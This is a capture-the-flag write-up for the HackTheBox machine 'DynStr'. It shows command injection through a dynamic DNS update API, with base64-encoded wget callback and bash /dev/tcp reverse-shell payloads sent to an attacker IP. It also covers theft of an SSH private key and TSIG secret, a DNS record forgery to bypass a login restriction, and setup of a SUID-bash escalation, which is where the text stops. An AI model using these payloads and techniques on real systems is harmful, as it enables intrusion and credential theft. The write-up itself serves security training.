# HackTheBox-DynStr-Writeup

![Screen Shot 2021-10-14 at 04 10 21](https://user-images.githubusercontent.com/8503135/137306574-3382fecb-aea2-4bca-bd6b-267837c710be.png)

+ # Index
   + ### [Enumeration](#enumeration-1)
   + ### [Initial Access](#initial-access-1)
   + ### [Privilege Escalation User](#privilege-escalation-user-1)
   + ### [Privilege Escalation Root](#privilege-escalation-root-1)
   + ### [References](#references-1)
# Synopsis

“DynStr” is marked as medium difficulty machine that features dynamic DNS update API service via HTTP. The homepage reveals domains, credentials and hostname, directory brute force gives us a path where the API is being used. Using gathered credentials we push the update to get remote code execution on machine. User SSH key’s were stored in ‘strace’ output file, but there’s restriction to login via SSH. It only allows specific domain to login, we modify the name server and update it with new domain and link it to our IP address, and then login via SSH to user. Sudo capability is enabled to current user to run a specific  script, we take advantage of that to gain root .

# Skills Required

- DNS enumeration

# Skills Learned

- Dynamic DNS Update & Exploit
- Name Server Update
- Linux Preserve Mode and Quotation marks

# Enumeration

```
🔥\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.48.120
Nmap scan report for 10.129.48.120
Host is up (0.25s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals port 22, 53 and 80 is open on the machine, possibly Ubuntu Focal 20.04 LTS. Let’s check HTTP service.

![Screen Shot 2021-06-23 at 22.26.11.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/9B5EB8D9-379F-442F-A890-D8AD1E7D9248/41982C40-139C-4DB5-A737-77F4BC8FE842_2/Screen%20Shot%202021-06-23%20at%2022.26.11.png)

![Screen Shot 2021-06-23 at 22.27.41.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/9B5EB8D9-379F-442F-A890-D8AD1E7D9248/B52535CC-BB34-4343-BA17-F6D2F31C934A_2/Screen%20Shot%202021-06-23%20at%2022.27.41.png)

The website reveals credentials, domains hostname. Let’s add the hostname to our hosts file.

```
🔥\> sudo sh -c "echo '10.129.48.120  dyna.htb' >> /etc/hosts"
```

Let’s run directory brute force in the domain/IP

```
🔥\> gobuster dir -u http://dyna.htb -t 30 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -b 404,403

/assets               (Status: 301) [Size: 305] [--> http://dyna.htb/assets/]
/.                    (Status: 200) [Size: 10909]
/nic                  (Status: 301) [Size: 302] [--> http://dyna.htb/nic/]
```

The nic directory is blank, let’s run Directory brute force on nic.

```
🔥\> gobuster dir -u http://dyna.htb/nic/ -t 30 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -b 404,4
03

/update               (Status: 200) [Size: 8]
```

Upon visiting the directory it says ‘badauth’, as in ‘bad authentication’.

![Screen Shot 2021-06-23 at 23.25.29.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/9B5EB8D9-379F-442F-A890-D8AD1E7D9248/4D468B7A-049D-4C99-BB1A-3FB3B94F77A1_2/Screen%20Shot%202021-06-23%20at%2023.25.29.png)

Previously we got credentials from the homepage, let’s pass those credentials with the GET request.

#### cURL

```
🔥\> curl --user dynadns:sndanyd http://dyna.htb/nic/update/ -v
*   Trying 10.129.48.120:80...
* Connected to dyna.htb (10.129.48.120) port 80 (#0)
* Server auth using Basic with user 'dynadns'
> GET /nic/update/ HTTP/1.1
> Host: dyna.htb
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 24 Jun 2021 06:33:44 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 18
< Content-Type: text/html; charset=UTF-8
<
nochg 10.10.14.11
* Connection #0 to host dyna.htb left intact
```

The credentials are legit and we go the response. It say’s “nochg 10.10.14.11”. Upon quick google we get to know that Dynamic DNS is running and it is using an update API function to update the IP addresses of dynamic DNS hostnames.

![flow_page-0001.jpg.jpeg](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/9B5EB8D9-379F-442F-A890-D8AD1E7D9248/F84A2F63-62F0-4AD3-B2C4-75801C1BB5D1_2/flow_page-0001.jpg.jpeg)

[Dynamic DNS Update API | Dyn Help Center](https://help.dyn.com/remote-access-api/)

The above flowchart gives us information on how this update works and it’s error and successful messages. So far we have encountered two messages,

- ‘badauth’ - The username and password pair do not match a real user.
- ‘nochg’ - A nochg indicates a successful update but the IP address or other settings have not changed.

So, somehow we need to get ‘good’ message from server by updating hostname and/or IP address or any other settings. Below link will help us to understand the update process.

[Perform Update (RA-API) | Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)

Let’s update with hostname and IP address.

**cURL - 2**

```
🔥\> curl --user dynadns:sndanyd 'http://dyna.htb/nic/update?hostname=demo.dyna.htb&myip=10.10.14.11' -v
*   Trying 10.129.48.120:80...
* Connected to dyna.htb (10.129.48.120) port 80 (#0)
* Server auth using Basic with user 'dynadns'
> GET /nic/update?hostname=demo.dyna.htb&myip=10.10.14.11 HTTP/1.1
> Host: dyna.htb
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 24 Jun 2021 07:01:09 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 24
< Content-Type: text/html; charset=UTF-8
<
911 [wrngdom: dyna.htb]
* Connection #0 to host dyna.htb left intact
```

The response message (error code) is 911. It say’s that wrngdom, possibly means wrong domain. Let’s try with other domain which we got from homepage.

**cURL - 3**

```
🔥\> curl --user dynadns:sndanyd 'http://dyna.htb/nic/update?hostname=update.dnsalias.htb&myip=10.10.14.11' -v
*   Trying 10.129.48.120:80...
* Connected to dyna.htb (10.129.48.120) port 80 (#0)
* Server auth using Basic with user 'dynadns'
> GET /nic/update?hostname=update.dnsalias.htb&myip=10.10.14.11 HTTP/1.1
> Host: dyna.htb
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 24 Jun 2021 07:14:38 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 17
< Content-Type: text/html; charset=UTF-8
<
good 10.10.14.11
* Connection #0 to host dyna.htb left intact
```

This time we got the ‘good’ response message, so we can use this domain for further purpose. A Vulnerability exists in dynamic DNS.

[DNS Server Dynamic Update Record Injection](https://www.tenable.com/plugins/nessus/35372)

Let’s try to run linux command inside hostname to get RCE.

**cURL - 4**

```
🔥\> curl --user dynadns:sndanyd "http://dyna.htb/nic/update?hostname=`whoami`.dnsalias.htb&myip=10.10.14.11" -v
*   Trying 10.129.48.120:80...
* Connected to dyna.htb (10.129.48.120) port 80 (#0)
* Server auth using Basic with user 'dynadns'
> GET /nic/update?hostname=kali.dnsalias.htb&myip=10.10.14.11 HTTP/1.1
> Host: dyna.htb
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 24 Jun 2021 10:56:39 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 17
< Content-Type: text/html; charset=UTF-8
<
good 10.10.14.11
* Connection #0 to host dyna.htb left intact
```

As you can see, under hostname value we are using linux command ‘whoami’ as subdomain. The response message is positive that means, it is working.

> Difference Between Single/Double Quote and Backtick **Single Quote**: Enclosing characters in single quotation marks (‘) holds onto the literal value of each character within the quotes. **Double Quote**: Double quotes are similar to single quotes except that it allows the  to interpret dollar sign ($), backtick(`), backslash() and exclamation mark(!).

> **Example -** I have assigned value to test variable, using single quote and double let’s see how they work.

```
🔥\> echo '$test'
$test

🔥\> echo "$test"
quote
```

> As you can see, when single quote is used it print the literal value but when double quote executed the value.  **Backtick**: Everything we type between backticks is evaluated (executed) by the  before the main command.  **Example**:

```
🔥\> echo uname
uname

🔥\> echo `uname`
Linux
```

> As you can see, first executed without backtick and it just print the string which I used, but in second I used backtick and so it executed and print the value.

Coming back to our RCE, I used backtick in above curl command as subdomain with hostname. So, the server before validating the hostname it executed our linux command. It doesn’t proves that we have a working RCE. Let’s get a confirmation whether there’s a possibility of an RCE exists or not. For this we need to open port 80, use base64 to encode wget payload and convert payload into url encode.

**cURL - 5**

```
🔥\> nc -lvnp 80
listening on [any] 80 ...

🔥\> echo -n 'wget 10.10.14.11' | base64
d2dldCAxMC4xMC4xNC4xMQ==

🔥\> printf %s '`echo d2dldCAxMC4xMC4xNC4xMQ== | base64 -d | bash`'|jq -sRr @uri
%60echo%20d2dldCAxMC4xMC4xNC4xMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash%60
```

Under URL encoding we are using the base64 string, piping it for decoding and piping it again to bash. If it works, then we would see a connection request on out netcat listener. Let’s execute out CURL command.

```
🔥\> curl --user dynadns:sndanyd 'http://dyna.htb/nic/update?hostname=%60echo%20d2dldCAxMC4xMC4xNC4xMQ%3D%3D%20%7C%20base64%20-d%20%7C%20bash%60.dnsalias.htb&myip=10.10.14.11' -v
```

Check your NetCat Listener.

```
🔥\> nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.11] from (UNKNOWN) [10.129.48.120] 48594
GET / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.14.11
Connection: Keep-Alive
```

We got a working RCE confirmation now. Let’s get a reverse connection.

# Initial Access

```
🔥\> pwncat -l -p 1234
bound to 0.0.0.0:1234

🔥\> echo -n 'bash -i >& /dev/tcp/10.10.14.11/1234 0>&1' |
base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjM0IDA+JjE=

🔥\> printf %s '`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjM0IDA+JjE= | base64 -d | bash`'|jq -sRr @uri
%60echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjM0IDA%2BJjE%3D%20%7C%20base64%20-d%20%7C%20bash%60
```

We got all we need to get reverse connection. Let’s run it with CURL.

```
🔥\> curl --user dynadns:sndanyd 'http://dyna.htb/nic/update?hostname=%60echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMjM0IDA%2BJjE%3D%20%7C%20base64%20-d%20%7C%20bash%60.dnsalias.htb&myip=10.10.14.11' -v
```

Check Netcat/Pwncat listener.

```
🔥\> pwncat -l -p 1234
[11:54:56] received connection from          connect.py:255                                         10.129.48.120:43154

[11:55:00] new host w/ hash d984ca56f2f84920ac9049657d293f4e                                              victim.py:321
[11:55:11] pwncat running in /usr/bin/bash                                                                victim.py:354
[11:55:19] pwncat is ready 🐈                                                                             victim.py:771

(remote) www-data@dynstr.dyna.htb:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have www-data access. Let’s look for other user accounts.

# Privilege Escalation User

```
(remote) www-data@dynstr.dyna.htb:/$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
dyna:x:1000:1000:dyna,,,:/home/dyna:/bin/bash
bindmgr:x:1001:1001::/home/bindmgr:/bin/bash
```

We got two user accounts. Let’s look into their respective home directory.

```
(remote) www-data@dynstr.dyna.htb:/home$ ls -la *
bindmgr:
total 36
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
-rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
-rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Jun 24 07:17 user.txt

dyna:
total 24
drwxr-xr-x 3 dyna dyna 4096 Mar 18 20:00 .
drwxr-xr-x 4 root root 4096 Mar 15 20:26 ..
lrwxrwxrwx 1 dyna dyna    9 Mar 18 20:00 .bash_history -> /dev/null
-rw-r--r-- 1 dyna dyna  220 Mar 15 20:01 .bash_logout
-rw-r--r-- 1 dyna dyna 3771 Mar 15 20:01 .bashrc
drwx------ 2 dyna dyna 4096 Mar 15 20:01 .cache
-rw-r--r-- 1 dyna dyna  807 Mar 15 20:01 .profile
-rw-r--r-- 1 dyna dyna    0 Mar 15 20:02 .sudo_as_admin_successful
```

Dyna user doesn’t have any useful information, but bindmgr user has SSH and support directory.

```
(remote) www-data@dynstr.dyna.htb:/home/bindmgr/.ssh$ ls -la
total 24
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13 12:00 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13 11:48 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13 12:09 known_hosts

(remote) www-data@dynstr.dyna.htb:/home/bindmgr/.ssh$ cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

If we read authorized_keys file, the we’d find something interesting. The SSH login is restricted to specific domain (*.infra.dyna.htb).

Inside support directory there are multiple files.

```
(remote) www-data@dynstr.dyna.htb:/home/bindmgr$ ls -la support-case-C62796521/
total 436
drwxr-xr-x 2 bindmgr bindmgr   4096 Mar 13 14:53 .
drwxr-xr-x 5 bindmgr bindmgr   4096 Mar 15 20:39 ..
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13 14:53 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13 14:53 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txt
```

Inside ‘strace’ text file there is SSH private key store. I got this information from LinPeas.

```
Possible private SSH keys were found!
/home/bindmgr/support-case-C62796521/strace-C62796521.txt
```

Let’s grep the keys from the file.

```
(remote) www-data@dynstr.dyna.htb:/home$ cat bindmgr/support-case-C62796521/strace-C62796521.txt | grep SSH
15123 sendto(3, "SSH-2.0-libssh2_1.8.0\r\n", 23, MSG_NOSIGNAL, NULL, 0) = 23
15123 write(2, "SSH MD5 fingerprint: c1c2d07855aa0f80005de88d254a6db8\n", 54) = 54
15123 write(2, "SSH authentication methods available: publickey,password\n", 57) = 57
15123 write(2, "Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub'\n", 58) = 58
15123 write(2, "Using SSH private key file '/home/bindmgr/.ssh/id_rsa'\n", 55) = 55
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
15123 write(2, "SSH public key authentication failed: Callback returned error\n", 62) = 62
```

Copy the key to your machine and remove the LF (line feed \n) from the file.

```
🔥\> cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Now we have private key, but if we use it won’t work. We need to satisfy the IP/domain restriction as defined in the authorized_keys (*.infra.dyna.htb). Let’s check TSIG (Transaction Signature) shared secret key from bind directory. If we have access to TSIG key then we can use that key to update the name server of a our DNS zone.

```
(remote) www-data@dynstr.dyna.htb:/etc/bind$ ls -la
total 68
drwxr-sr-x  3 root bind 4096 Mar 20 12:00 .
drwxr-xr-x 80 root root 4096 Jun  8 19:20 ..
-rw-r--r--  1 root root 1991 Feb 18 04:28 bind.keys
-rw-r--r--  1 root root  237 Dec 17  2019 db.0
-rw-r--r--  1 root root  271 Dec 17  2019 db.127
-rw-r--r--  1 root root  237 Dec 17  2019 db.255
-rw-r--r--  1 root root  353 Dec 17  2019 db.empty
-rw-r--r--  1 root root  270 Dec 17  2019 db.local
-rw-r--r--  1 root bind  100 Mar 15 20:44 ddns.key
-rw-r--r--  1 root bind  101 Mar 15 20:44 infra.key
drwxr-sr-x  2 root bind 4096 Mar 15 20:42 named.bindmgr
-rw-r--r--  1 root bind  463 Dec 17  2019 named.conf
-rw-r--r--  1 root bind  498 Dec 17  2019 named.conf.default-zones
-rw-r--r--  1 root bind  969 Mar 15 20:46 named.conf.local
-rw-r--r--  1 root bind  895 Mar 15 20:46 named.conf.options
-rw-r-----  1 bind bind  100 Mar 15 20:14 rndc.key
-rw-r--r--  1 root root 1317 Dec 17  2019 zones.rfc1918
```

We have multiple key files inside bind directory. If we look at the restricted domain from authorized_keys, it says *.infra.dyna.htb. So, infra.key file will be used to update name server. We do have permission to read the infra.key file.

```
(remote) www-data@dynstr.dyna.htb:/etc/bind$ cat infra.key
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};
```

Let’s update the name server.

```
(remote) www-data@dynstr.dyna.htb:/etc$ nsupdate -k /etc/bind/infra.key
> update add test.infra.dyna.htb 18000 A 10.10.14.11
>
> update add 11.14.10.10.in-addr.arpa 18000 PTR test.infra.dyna.htb
```

We need to provide the keyfile and use update command with domain name, TTL, Class, Data (IP). In the second update, we need to add our IP in reverse with arpa address for reverse mapping, TTL, Class and domain.

> Note: Make sure to leave a blank line after each update so that a group of commands are sent as one dynamic update request to the server.

Once you update the name server, you can check the current message and send it to server and quit.

```
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
11.14.10.10.in-addr.arpa. 18000 IN      PTR     test.infra.dyna.htb.

> send
> quit
```

Now we can login via SSH using private key which we acquired previously and read the user flag.

```
🔥\> ssh -i id_rsa bindmgr@dyna.htb
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb

bindmgr@dynstr:~$ id
uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)

bindmgr@dynstr:~$ cat user.txt
30f7d7e7e335a595a3b7d54a8e5e1b7e
```

# Privilege Escalation root

List sudo capability for current user.

```
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

We can run this  script as root without password. Let’s check the contents of that script.

```
bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr.
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
        systemctl status bind9
    else
        echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

This script checks for a file called ‘.version’ in current directory, if its exists then copies all the content to /etc/bind/named.bindmgr/ directory. So, we can put bash binary and set the binary with SUID bit, and we need to preserve the current ownership and permissions while copying the files.

```
bindmgr@dynstr:~/test$ echo '1' > .version

bindmgr@dynstr:~/test$ cp /bin/bash .

bindmgr@dynstr:~/test$ chmod +s bash

bindmgr@dynstr:~/test$ echo > '--preserve=mode'
```

